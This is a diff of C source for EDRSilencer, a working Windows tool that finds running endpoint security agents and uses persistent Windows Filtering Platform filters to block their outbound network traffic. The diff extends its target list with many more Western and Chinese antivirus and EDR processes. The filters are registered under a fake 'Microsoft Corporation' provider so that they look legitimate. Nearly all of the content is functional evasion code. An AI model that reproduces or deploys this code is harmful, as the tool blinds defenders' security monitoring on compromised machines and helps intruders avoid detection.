@@ -1,66 +1,76 @@
 #include "utils.h"
 
-char* edrProcess[] = {
-// Microsoft Defender for Endpoint and Microsoft Defender Antivirus
+char *edrProcess[] = {
+    // Microsoft Defender for Endpoint and Microsoft Defender Antivirus
     "MsMpEng.exe",
     "MsSense.exe",
     "SenseIR.exe",
     "SenseNdr.exe",
     "SenseCncProxy.exe",
     "SenseSampleUploader.exe",
-// Elastic EDR
-	"winlogbeat.exe",
+    "HealthService.exe",  // Microsoft SCOM
+    "MonitoringHost.exe", // Microsoft SCOM
+    "MpCmdRun.exe",
+    // Elastic EDR
+    "winlogbeat.exe",
     "elastic-agent.exe",
     "elastic-endpoint.exe",
     "filebeat.exe",
-// Trellix EDR
+    // Trellix EDR
     "xagt.exe",
-// Qualys EDR
+    // Qualys EDR
     "QualysAgent.exe",
-// SentinelOne
+    // SentinelOne
     "SentinelAgent.exe",
     "SentinelAgentWorker.exe",
     "SentinelServiceHost.exe",
-    "SentinelStaticEngine.exe",  
+    "SentinelStaticEngine.exe",
     "LogProcessorService.exe",
     "SentinelStaticEngineScanner.exe",
     "SentinelHelperService.exe",
     "SentinelBrowserNativeHost.exe",
-// Cylance
+    "LogCollector.exe",
+    "SentinelMemoryScanner.exe",
+    "SentinelRanger.exe",
+    "SentinelRemediation.exe",
+    "SentinelRemoteShellHost.exe",
+    "SentinelScanFromContextMenu.exe",
+    "SentinelUI.exe",
+    // Cylance
     "CylanceSvc.exe",
-// Cybereason
+    // Cybereason
     "AmSvc.exe",
     "CrAmTray.exe",
     "CrsSvc.exe",
     "ExecutionPreventionSvc.exe",
     "CybereasonAV.exe",
-// Carbon Black EDR
+    // Carbon Black EDR
     "cb.exe",
-// Carbon Black Cloud
+    // Carbon Black Cloud
     "RepMgr.exe",
     "RepUtils.exe",
     "RepUx.exe",
     "RepWAV.exe",
     "RepWSC.exe",
-// Tanium
+    // Tanium
     "TaniumClient.exe",
     "TaniumCX.exe",
     "TaniumDetectEngine.exe",
-// Palo Alto Networks Traps/Cortex XDR
+    // Palo Alto Networks Traps/Cortex XDR
     "Traps.exe",
     "cyserver.exe",
     "CyveraService.exe",
     "CyvrFsFlt.exe",
-// FortiEDR
+    // FortiEDR
     "fortiedr.exe",
-// Cisco Secure Endpoint (Formerly Cisco AMP)
+    // Cisco Secure Endpoint (Formerly Cisco AMP)
     "sfc.exe",
-// ESET Inspect
+    // ESET Inspect
     "EIConnector.exe",
     "ekrn.exe",
-// Harfanglab EDR
+    // Harfanglab EDR
     "hurukai.exe",
-//TrendMicro Apex One
+    // TrendMicro Apex One
     "CETASvc.exe",
     "WSCommunicator.exe",
     "EndpointBasecamp.exe",
@@ -70,23 +80,149 @@ char* edrProcess[] = {
     "PccNTMon.exe",
     "TMBMSRV.exe",
     "CNTAoSMgr.exe",
-    "TmCCSF.exe"
+    "TmCCSF.exe",
+    // 火绒
+    "wsctrlsvc.exe",
+    "HipsTray.exe",
+    "HipsDaemon.exe",
+    // 360
+    "360AI.exe",
+    "360apploader.exe",
+    "360BoxLd64.exe",
+    "360boxmain.exe",
+    "360DeskAna.exe",
+    "360DeskAna64.exe",
+    "360DiagnoseScan.exe",
+    "360fab.exe",
+    "360Feedback.exe",
+    "360FileGuard.exe",
+    "360HImmu.exe",
+    "360hips.exe",
+    "360hotfix.exe",
+    "360Inst.exe",
+    "360LogCenter.exe",
+    "360MsgCenter.exe",
+    "360netcfg.exe",
+    "360netcfg64.exe",
+    "360netman.exe",
+    "360NetRepair.exe",
+    "360PatchMgr.exe",
+    "360PatchMgr64.exe",
+    "360PayInsure.exe",
+    "360QandAExpert.exe",
+    "360QMachine.exe",
+    "360realpro.exe",
+    "360Restore.exe",
+    "360rp.exe",
+    "360rps.exe",
+    "360Safe.exe",
+    "360sclog.exe",
+    "360ScreenCapture.exe",
+    "360sctblist.exe",
+    "360sd.exe",
+    "360sdrun.exe",
+    "360sdSetup.exe",
+    "360sdToasts.exe",
+    "360sdupd.exe",
+    "360SettingCenter.exe",
+    "360ShellPro.exe",
+    "360skininstall.exe",
+    "360SkinMgr.exe",
+    "360SPTool.exe",
+    "360taskmgr.exe",
+    "360Toasts.exe",
+    "360tray.exe",
+    "360UDiskCheck.exe",
+    "360UDiskGuard.exe",
+    "360UHelper.exe",
+    "DataProt.exe",
+    "defaultsoftset.exe",
+    "dep360.exe",
+    "DSMain.exe",
+    "DumpUper.exe",
+    "EaInstHelper.exe",
+    "EaInstHelper64.exe",
+    "feedback.exe",
+    "FileSmasher.exe",
+    "GetSvcName.exe",
+    "GetSvcName64.exe",
+    "LiveUpdate360.exe",
+    "ModuleUpdate.exe",
+    "PopWndLog.exe",
+    "PopwndTracker.exe",
+    "PowerSaver.exe",
+    "ProcTree.exe",
+    "Recovery360.exe",
+    "Relocate.exe",
+    "repair.exe",
+    "safedog.exe",
+    "SDIS.exe",
+    "SetupArpX64.exe",
+    "SoftMgr.exe",
+    "SoftMgr64.exe",
+    "SoftupNotify.exe",
+    "SRAgent.exe",
+    "SuperKiller.exe",
+    "uninst.exe",
+    "Uninst.exe",
+    "UpTip.exe",
+    "wdfixsc.exe",
+    "WDPayPro.exe",
+    "WDSafeDown.exe",
+    "wdswfsafe.exe",
+    "Win32FuncLoader.exe",
+    "windvd.exe",
+    "WscControl.exe",
+    "xpbackup.exe",
+    "ZhuDongFangYu.exe",
+    // 百度杀软
+    "BaiduSdSvc.exe",
+    // 安全狗
+    "SafeDogGuardCenter.exe",
+    "safedogupdatecenter.exe",
+    "safedogguardcenter.exe",
+    "SafeDogSiteIIS.exe",
+    "SafeDogTray.exe",
+    "SafeDogServerUI.exe",
+    // D盾
+    "D_Safe_Manage.exe",
+    "d_manage.exe",
+    // 云锁
+    "yunsuo_agent_service.exe",
+    "yunsuo_agent_daemon.exe",
+    // 护卫神
+    "HwsPanel.exe",
+    "hws_ui.exe",
+    "hws.exe",
+    "hwsd.exe",
+    // 火绒
+    "hipstray.exe",
+    "wsctrl.exe",
+    "usysdiag.exe",
+    // 趋势科技
+    "TMBMSRV.exe",
+    "ntrtscan.exe",
+    "PCCNTMON.exe",
+    "TMLISTEN.exe",
 };
 
 // The "unblockall" feature will delete all filters that are based on the custom filter name
-WCHAR* filterName = L"Custom Outbound Filter";
-WCHAR* providerName = L"Microsoft Corporation";
+WCHAR *filterName = L"Custom Outbound Filter";
+WCHAR *providerName = L"Microsoft Corporation";
 // provider description has to be unique because:
 // - avoid problem in adding persistent WFP filter to a provider (error 0x80320016)
 // - avoid removing legitimate WFP provider
-WCHAR* providerDescription = L"Microsoft Windows WFP Built-in custom provider.";
+WCHAR *providerDescription = L"Microsoft Windows WFP Built-in custom provider.";
 
-BOOL inWfpFlag[sizeof(edrProcess) / sizeof(edrProcess[0])] = { FALSE };
+BOOL inWfpFlag[sizeof(edrProcess) / sizeof(edrProcess[0])] = {FALSE};
 
 // Check if the running process is our list
-BOOL isInEdrProcessList(const char* procName) {
-    for (int i = 0; i < sizeof(edrProcess) / sizeof(edrProcess[0]); i++) {
-        if (strcmp(procName, edrProcess[i]) == 0 && !inWfpFlag[i]) {
+BOOL isInEdrProcessList(const char *procName)
+{
+    for (int i = 0; i < sizeof(edrProcess) / sizeof(edrProcess[0]); i++)
+    {
+        if (strcmp(procName, edrProcess[i]) == 0 && !inWfpFlag[i])
+        {
             inWfpFlag[i] = TRUE;
             return TRUE;
         }
@@ -95,7 +231,8 @@ BOOL isInEdrProcessList(const char* procName) {
 }
 
 // Add WFP filters for all known EDR process(s)
-void BlockEdrProcessTraffic() {
+void BlockEdrProcessTraffic()
+{
     DWORD result = 0;
     HANDLE hEngine = NULL;
     HANDLE hProcessSnap = NULL;
@@ -104,68 +241,76 @@ void BlockEdrProcessTraffic() {
     BOOL isEdrDetected = FALSE;
 
     result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_DEFAULT, NULL, NULL, &hEngine);
-    if (result != ERROR_SUCCESS) {
+    if (result != ERROR_SUCCESS)
+    {
         printf("[-] FwpmEngineOpen0 failed with error code: 0x%x.\n", result);
         return;
     }
-   
+
     EnableSeDebugPrivilege();
 
     hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hProcessSnap == INVALID_HANDLE_VALUE) {
+    if (hProcessSnap == INVALID_HANDLE_VALUE)
+    {
         printf("[-] CreateToolhelp32Snapshot (of processes) failed with error code: 0x%x.\n", GetLastError());
         return;
     }
 
     pe32.dwSize = sizeof(PROCESSENTRY32);
-    if (!Process32First(hProcessSnap, &pe32)) {
+    if (!Process32First(hProcessSnap, &pe32))
+    {
         printf("[-] Process32First failed with error code: 0x%x.\n", GetLastError());
         CloseHandle(hProcessSnap);
         return;
     }
 
-    do {
-        if (isInEdrProcessList(pe32.szExeFile)) {
+    do
+    {
+        if (isInEdrProcessList(pe32.szExeFile))
+        {
             isEdrDetected = TRUE;
             printf("Detected running EDR process: %s (%d):\n", pe32.szExeFile, pe32.th32ProcessID);
             // Get full path of the running process
             HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe32.th32ProcessID);
-            if (hProcess) {
+            if (hProcess)
+            {
                 WCHAR fullPath[MAX_PATH] = {0};
                 DWORD size = MAX_PATH;
                 FWPM_FILTER_CONDITION0 cond = {0};
                 FWPM_FILTER0 filter = {0};
                 FWPM_PROVIDER0 provider = {0};
                 GUID providerGuid = {0};
-                FWP_BYTE_BLOB* appId = NULL;
+                FWP_BYTE_BLOB *appId = NULL;
                 UINT64 filterId = 0;
                 ErrorCode errorCode = CUSTOM_SUCCESS;
-                
+
                 QueryFullProcessImageNameW(hProcess, 0, fullPath, &size);
                 errorCode = CustomFwpmGetAppIdFromFileName0(fullPath, &appId);
-                if (errorCode != CUSTOM_SUCCESS) {
-                    switch (errorCode) {
-                        case CUSTOM_FILE_NOT_FOUND:
-                            printf("    [-] CustomFwpmGetAppIdFromFileName0 failed to convert the \"%S\" to app ID format. The file path cannot be found.\n", fullPath);
-                            break;
-                        case CUSTOM_MEMORY_ALLOCATION_ERROR:
-                            printf("    [-] CustomFwpmGetAppIdFromFileName0 failed to convert the \"%S\" to app ID format. Error occurred in allocating memory for appId.\n", fullPath);
-                            break;
-                        case CUSTOM_NULL_INPUT:
-                            printf("    [-] CustomFwpmGetAppIdFromFileName0 failed to convert the \"%S\" to app ID format. Please check your input.\n", fullPath);
-                            break;
-                        case CUSTOM_DRIVE_NAME_NOT_FOUND:
-                            printf("    [-] CustomFwpmGetAppIdFromFileName0 failed to convert the \"%S\" to app ID format. The drive name cannot be found.\n", fullPath);
-                            break;
-                        case CUSTOM_FAILED_TO_GET_DOS_DEVICE_NAME:
-                            printf("    [-] CustomFwpmGetAppIdFromFileName0 failed to convert the \"%S\" to app ID format. Failed to convert drive name to DOS device name.\n", fullPath);
-                            break;
-                        default:
-                            break;
+                if (errorCode != CUSTOM_SUCCESS)
+                {
+                    switch (errorCode)
+                    {
+                    case CUSTOM_FILE_NOT_FOUND:
+                        printf("    [-] CustomFwpmGetAppIdFromFileName0 failed to convert the \"%S\" to app ID format. The file path cannot be found.\n", fullPath);
+                        break;
+                    case CUSTOM_MEMORY_ALLOCATION_ERROR:
+                        printf("    [-] CustomFwpmGetAppIdFromFileName0 failed to convert the \"%S\" to app ID format. Error occurred in allocating memory for appId.\n", fullPath);
+                        break;
+                    case CUSTOM_NULL_INPUT:
+                        printf("    [-] CustomFwpmGetAppIdFromFileName0 failed to convert the \"%S\" to app ID format. Please check your input.\n", fullPath);
+                        break;
+                    case CUSTOM_DRIVE_NAME_NOT_FOUND:
+                        printf("    [-] CustomFwpmGetAppIdFromFileName0 failed to convert the \"%S\" to app ID format. The drive name cannot be found.\n", fullPath);
+                        break;
+                    case CUSTOM_FAILED_TO_GET_DOS_DEVICE_NAME:
+                        printf("    [-] CustomFwpmGetAppIdFromFileName0 failed to convert the \"%S\" to app ID format. Failed to convert drive name to DOS device name.\n", fullPath);
+                        break;
+                    default:
+                        break;
                     }
                     CloseHandle(hProcess);
                     continue;
-                } 
+                }
 
                 // Sett up WFP filter and condition
                 filter.displayData.name = filterName;
@@ -182,18 +327,25 @@ void BlockEdrProcessTraffic() {
                 filter.filterCondition = &cond;
                 filter.numFilterConditions = 1;
 
-                 // Add WFP provider for the filter
-                if (GetProviderGUIDByDescription(providerDescription, &providerGuid)) {
+                // Add WFP provider for the filter
+                if (GetProviderGUIDByDescription(providerDescription, &providerGuid))
+                {
                     filter.providerKey = &providerGuid;
-                } else {
+                }
+                else
+                {
                     provider.displayData.name = providerName;
                     provider.displayData.description = providerDescription;
                     provider.flags = FWPM_PROVIDER_FLAG_PERSISTENT;
                     result = FwpmProviderAdd0(hEngine, &provider, NULL);
-                    if (result != ERROR_SUCCESS) {
+                    if (result != ERROR_SUCCESS)
+                    {
                         printf("    [-] FwpmProviderAdd0 failed with error code: 0x%x.\n", result);
-                    } else {
-                        if (GetProviderGUIDByDescription(providerDescription, &providerGuid)) {
+                    }
+                    else
+                    {
+                        if (GetProviderGUIDByDescription(providerDescription, &providerGuid))
+                        {
                             filter.providerKey = &providerGuid;
                         }
                     }
@@ -201,29 +353,38 @@ void BlockEdrProcessTraffic() {
 
                 // Add filter to both IPv4 and IPv6 layers
                 result = FwpmFilterAdd0(hEngine, &filter, NULL, &filterId);
-                if (result == ERROR_SUCCESS) {
+                if (result == ERROR_SUCCESS)
+                {
                     printf("    Added WFP filter for \"%S\" (Filter id: %d, IPv4 layer).\n", fullPath, filterId);
-                } else {
+                }
+                else
+                {
                     printf("    [-] Failed to add filter in IPv4 layer with error code: 0x%x.\n", result);
                 }
-                
+
                 filter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V6;
                 result = FwpmFilterAdd0(hEngine, &filter, NULL, &filterId);
-                if (result == ERROR_SUCCESS) {
+                if (result == ERROR_SUCCESS)
+                {
                     printf("    Added WFP filter for \"%S\" (Filter id: %d, IPv6 layer).\n", fullPath, filterId);
-                } else {
+                }
+                else
+                {
                     printf("    [-] Failed to add filter in IPv6 layer with error code: 0x%x.\n", result);
                 }
 
                 FreeAppId(appId);
                 CloseHandle(hProcess);
-            } else {
+            }
+            else
+            {
                 printf("    [-] Could not open process \"%s\" with error code: 0x%x.\n", pe32.szExeFile, GetLastError());
             }
         }
     } while (Process32Next(hProcessSnap, &pe32));
 
-    if (!isEdrDetected) {
+    if (!isEdrDetected)
+    {
         printf("[-] No EDR process was detected. Please double check the edrProcess list or add the filter manually using 'block' command.\n");
     }
     CloseHandle(hProcessSnap);
@@ -232,7 +393,8 @@ void BlockEdrProcessTraffic() {
 }
 
 // Add block WFP filter to user-defined process
-void BlockProcessTraffic(char* fullPath) {
+void BlockProcessTraffic(char *fullPath)
+{
     DWORD result = 0;
     HANDLE hEngine = NULL;
     WCHAR wFullPath[MAX_PATH] = {0};
@@ -241,36 +403,39 @@ void BlockProcessTraffic(char* fullPath) {
     FWPM_FILTER0 filter = {0};
     FWPM_PROVIDER0 provider = {0};
     GUID providerGuid = {0};
-    FWP_BYTE_BLOB* appId = NULL;
+    FWP_BYTE_BLOB *appId = NULL;
     UINT64 filterId = 0;
     ErrorCode errorCode = CUSTOM_SUCCESS;
-    
+
     result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_DEFAULT, NULL, NULL, &hEngine);
-    if (result != ERROR_SUCCESS) {
+    if (result != ERROR_SUCCESS)
+    {
         printf("[-] FwpmEngineOpen0 failed with error code: 0x%x.\n", result);
         return;
     }
     CharArrayToWCharArray(fullPath, wFullPath, sizeof(wFullPath) / sizeof(wFullPath[0]));
     errorCode = CustomFwpmGetAppIdFromFileName0(wFullPath, &appId);
-    if (errorCode != CUSTOM_SUCCESS) {
-        switch (errorCode) {
-            case CUSTOM_FILE_NOT_FOUND:
-                printf("[-] CustomFwpmGetAppIdFromFileName0 failed to convert the \"%S\" to app ID format. The file path cannot be found.\n", wFullPath);
-                break;
-            case CUSTOM_MEMORY_ALLOCATION_ERROR:
-                printf("[-] CustomFwpmGetAppIdFromFileName0 failed to convert the \"%S\" to app ID format. Error occurred in allocating memory for appId.\n", wFullPath);
-                break;
-            case CUSTOM_NULL_INPUT:
-                printf("[-] CustomFwpmGetAppIdFromFileName0 failed to convert the \"%S\" to app ID format. Please check your input.\n", wFullPath);
-                break;
-            case CUSTOM_DRIVE_NAME_NOT_FOUND:
-                printf("[-] CustomFwpmGetAppIdFromFileName0 failed to convert the \"%S\" to app ID format. The drive name cannot be found.\n", wFullPath);
-                break;
-            case CUSTOM_FAILED_TO_GET_DOS_DEVICE_NAME:
-                printf("[-] CustomFwpmGetAppIdFromFileName0 failed to convert the \"%S\" to app ID format. Failed to convert drive name to DOS device name.\n", wFullPath);
-                break;
-            default:
-                break;
+    if (errorCode != CUSTOM_SUCCESS)
+    {
+        switch (errorCode)
+        {
+        case CUSTOM_FILE_NOT_FOUND:
+            printf("[-] CustomFwpmGetAppIdFromFileName0 failed to convert the \"%S\" to app ID format. The file path cannot be found.\n", wFullPath);
+            break;
+        case CUSTOM_MEMORY_ALLOCATION_ERROR:
+            printf("[-] CustomFwpmGetAppIdFromFileName0 failed to convert the \"%S\" to app ID format. Error occurred in allocating memory for appId.\n", wFullPath);
+            break;
+        case CUSTOM_NULL_INPUT:
+            printf("[-] CustomFwpmGetAppIdFromFileName0 failed to convert the \"%S\" to app ID format. Please check your input.\n", wFullPath);
+            break;
+        case CUSTOM_DRIVE_NAME_NOT_FOUND:
+            printf("[-] CustomFwpmGetAppIdFromFileName0 failed to convert the \"%S\" to app ID format. The drive name cannot be found.\n", wFullPath);
+            break;
+        case CUSTOM_FAILED_TO_GET_DOS_DEVICE_NAME:
+            printf("[-] CustomFwpmGetAppIdFromFileName0 failed to convert the \"%S\" to app ID format. Failed to convert drive name to DOS device name.\n", wFullPath);
+            break;
+        default:
+            break;
         }
         return;
     }
@@ -291,17 +456,24 @@ void BlockProcessTraffic(char* fullPath) {
     filter.numFilterConditions = 1;
 
     // Add WFP provider for the filter
-    if (GetProviderGUIDByDescription(providerDescription, &providerGuid)) {
+    if (GetProviderGUIDByDescription(providerDescription, &providerGuid))
+    {
         filter.providerKey = &providerGuid;
-    } else {
+    }
+    else
+    {
         provider.displayData.name = providerName;
         provider.displayData.description = providerDescription;
         provider.flags = FWPM_PROVIDER_FLAG_PERSISTENT;
         result = FwpmProviderAdd0(hEngine, &provider, NULL);
-        if (result != ERROR_SUCCESS) {
+        if (result != ERROR_SUCCESS)
+        {
             printf("[-] FwpmProviderAdd0 failed with error code: 0x%x.\n", result);
-        } else {
-            if (GetProviderGUIDByDescription(providerDescription, &providerGuid)) {
+        }
+        else
+        {
+            if (GetProviderGUIDByDescription(providerDescription, &providerGuid))
+            {
                 filter.providerKey = &providerGuid;
             }
         }
@@ -309,17 +481,23 @@ void BlockProcessTraffic(char* fullPath) {
 
     // Add filter to both IPv4 and IPv6 layers
     result = FwpmFilterAdd0(hEngine, &filter, NULL, &filterId);
-    if (result == ERROR_SUCCESS) {
+    if (result == ERROR_SUCCESS)
+    {
         printf("Added WFP filter for \"%s\" (Filter id: %d, IPv4 layer).\n", fullPath, filterId);
-    } else {
+    }
+    else
+    {
         printf("[-] Failed to add filter in IPv4 layer with error code: 0x%x.\n", result);
     }
 
     filter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V6;
     result = FwpmFilterAdd0(hEngine, &filter, NULL, &filterId);
-    if (result == ERROR_SUCCESS) {
+    if (result == ERROR_SUCCESS)
+    {
         printf("Added WFP filter for \"%s\" (Filter id: %d, IPv6 layer).\n", fullPath, filterId);
-    } else {
+    }
+    else
+    {
         printf("[-] Failed to add filter in IPv6 layer with error code: 0x%x.\n", result);
     }
 
@@ -329,66 +507,82 @@ void BlockProcessTraffic(char* fullPath) {
 }
 
 // Remove all WFP filters previously created
-void UnblockAllWfpFilters() {
+void UnblockAllWfpFilters()
+{
     HANDLE hEngine = NULL;
     DWORD result = 0;
     HANDLE enumHandle = NULL;
-    FWPM_FILTER0** filters = NULL;
+    FWPM_FILTER0 **filters = NULL;
     GUID providerGuid = {0};
     UINT32 numFilters = 0;
     BOOL foundFilter = FALSE;
     result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_DEFAULT, NULL, NULL, &hEngine);
-    if (result != ERROR_SUCCESS) {
+    if (result != ERROR_SUCCESS)
+    {
         printf("[-] FwpmEngineOpen0 failed with error code: 0x%x.\n", result);
         return;
     }
 
     result = FwpmFilterCreateEnumHandle0(hEngine, NULL, &enumHandle);
-    if (result != ERROR_SUCCESS) {
+    if (result != ERROR_SUCCESS)
+    {
         printf("[-] FwpmFilterCreateEnumHandle0 failed with error code: 0x%x.\n", result);
         return;
     }
 
-    while(TRUE) {
+    while (TRUE)
+    {
         result = FwpmFilterEnum0(hEngine, enumHandle, 1, &filters, &numFilters);
 
-        if (result != ERROR_SUCCESS) {
+        if (result != ERROR_SUCCESS)
+        {
             printf("[-] FwpmFilterEnum0 failed with error code: 0x%x.\n", result);
             FwpmFilterDestroyEnumHandle0(hEngine, enumHandle);
             FwpmEngineClose0(hEngine);
             return;
         }
 
-        if (numFilters == 0) {
-			break;
+        if (numFilters == 0)
+        {
+            break;
         }
-        
+
         FWPM_DISPLAY_DATA0 *data = &filters[0]->displayData;
-        WCHAR* currentFilterName = data->name;
-        if (wcscmp(currentFilterName, filterName) == 0) {
+        WCHAR *currentFilterName = data->name;
+        if (wcscmp(currentFilterName, filterName) == 0)
+        {
             foundFilter = TRUE;
             UINT64 filterId = filters[0]->filterId;
             result = FwpmFilterDeleteById0(hEngine, filterId);
-            if (result == ERROR_SUCCESS) {
+            if (result == ERROR_SUCCESS)
+            {
                 printf("Deleted filter id: %llu.\n", filterId);
-            } else {
+            }
+            else
+            {
                 printf("[-] Failed to delete filter id: %llu with error code: 0x%x.\n", filterId, result);
             }
         }
     }
 
-    if (GetProviderGUIDByDescription(providerDescription, &providerGuid)) {
+    if (GetProviderGUIDByDescription(providerDescription, &providerGuid))
+    {
         result = FwpmProviderDeleteByKey0(hEngine, &providerGuid);
-        if (result != ERROR_SUCCESS) {
-            if (result != FWP_E_IN_USE) {
+        if (result != ERROR_SUCCESS)
+        {
+            if (result != FWP_E_IN_USE)
+            {
                 printf("[-] FwpmProviderDeleteByKey0 failed with error code: 0x%x.\n", result);
             }
-        } else {
+        }
+        else
+        {
             printf("Deleted custom WFP provider.\n");
         }
     }
 
-    if (!foundFilter) {
+    if (!foundFilter)
+    {
         printf("[-] Unable to find any WFP filter created by this tool.\n");
     }
     FwpmFilterDestroyEnumHandle0(hEngine, enumHandle);
@@ -396,35 +590,46 @@ void UnblockAllWfpFilters() {
 }
 
 // Remove WFP filter based on filter id
-void UnblockWfpFilter(UINT64 filterId) {
+void UnblockWfpFilter(UINT64 filterId)
+{
     HANDLE hEngine = NULL;
     DWORD result = 0;
     GUID providerGuid = {0};
 
     result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_DEFAULT, NULL, NULL, &hEngine);
-    if (result != ERROR_SUCCESS) {
+    if (result != ERROR_SUCCESS)
+    {
         printf("[-] FwpmEngineOpen0 failed with error code: 0x%x.\n", result);
         return;
     }
-    
+
     result = FwpmFilterDeleteById0(hEngine, filterId);
 
-    if (result == ERROR_SUCCESS) {
+    if (result == ERROR_SUCCESS)
+    {
         printf("Deleted filter id: %llu.\n", filterId);
     }
-    else if (result == FWP_E_FILTER_NOT_FOUND) {
+    else if (result == FWP_E_FILTER_NOT_FOUND)
+    {
         printf("[-] The filter does not exist.\n");
-    } else {
+    }
+    else
+    {
         printf("[-] Failed to delete filter id: %llu with error code: 0x%x.\n", filterId, result);
     }
 
-    if (GetProviderGUIDByDescription(providerDescription, &providerGuid)) {
+    if (GetProviderGUIDByDescription(providerDescription, &providerGuid))
+    {
         result = FwpmProviderDeleteByKey0(hEngine, &providerGuid);
-        if (result != ERROR_SUCCESS) {
-            if (result != FWP_E_IN_USE) {
+        if (result != ERROR_SUCCESS)
+        {
+            if (result != FWP_E_IN_USE)
+            {
                 printf("[-] FwpmProviderDeleteByKey0 failed with error code: 0x%x.\n", result);
             }
-        } else {
+        }
+        else
+        {
             printf("Deleted custom WFP provider.\n");
         }
     }
@@ -432,7 +637,8 @@ void UnblockWfpFilter(UINT64 filterId) {
     FwpmEngineClose0(hEngine);
 }
 
-void PrintHelp() {
+void PrintHelp()
+{
     printf("Usage: EDRSilencer.exe <blockedr/block/unblockall/unblock>\n");
     printf("Version: 1.4\n");
     printf("- Add WFP filters to block the IPv4 and IPv6 outbound traffic of all detected EDR processes:\n");
@@ -445,33 +651,46 @@ void PrintHelp() {
     printf("  EDRSilencer.exe unblock <filter id>");
 }
 
-int main(int argc, char *argv[]) {
-    if (argc < 2) {
+int main(int argc, char *argv[])
+{
+    if (argc < 2)
+    {
         PrintHelp();
         return 1;
     }
 
-    if (strcasecmp(argv[1], "-h") == 0 || strcasecmp(argv[1], "--help") == 0) {
+    if (strcasecmp(argv[1], "-h") == 0 || strcasecmp(argv[1], "--help") == 0)
+    {
         PrintHelp();
         return 1;
     }
-    
-    if (!CheckProcessIntegrityLevel()) {
+
+    if (!CheckProcessIntegrityLevel())
+    {
         return 1;
     }
 
-    if (strcmp(argv[1], "blockedr") == 0) {
+    if (strcmp(argv[1], "blockedr") == 0)
+    {
         BlockEdrProcessTraffic();
-    } else if (strcmp(argv[1], "block") == 0) {
-        if (argc < 3) {
+    }
+    else if (strcmp(argv[1], "block") == 0)
+    {
+        if (argc < 3)
+        {
             printf("[-] Missing second argument. Please provide the full path of the process to block.\n");
             return 1;
         }
         BlockProcessTraffic(argv[2]);
-    } else if (strcmp(argv[1], "unblockall") == 0) {
+    }
+    else if (strcmp(argv[1], "unblockall") == 0)
+    {
         UnblockAllWfpFilters();
-    } else if (strcmp(argv[1], "unblock") == 0) {
-        if (argc < 3) {
+    }
+    else if (strcmp(argv[1], "unblock") == 0)
+    {
+        if (argc < 3)
+        {
             printf("[-] Missing argument for 'unblock' command. Please provide the filter id.\n");
             return 1;
         }
@@ -480,17 +699,21 @@ int main(int argc, char *argv[]) {
 
         UINT64 filterId = strtoull(argv[2], &endptr, 10);
 
-        if (errno != 0) {
+        if (errno != 0)
+        {
             printf("[-] strtoull failed with error code: 0x%x.\n", errno);
             return 1;
         }
 
-        if (endptr == argv[2]) {
+        if (endptr == argv[2])
+        {
             printf("[-] Please provide filter id in digits.\n");
             return 1;
         }
         UnblockWfpFilter(filterId);
-    } else {
+    }
+    else
+    {
         printf("[-] Invalid argument: \"%s\".\n", argv[1]);
         return 1;
     }
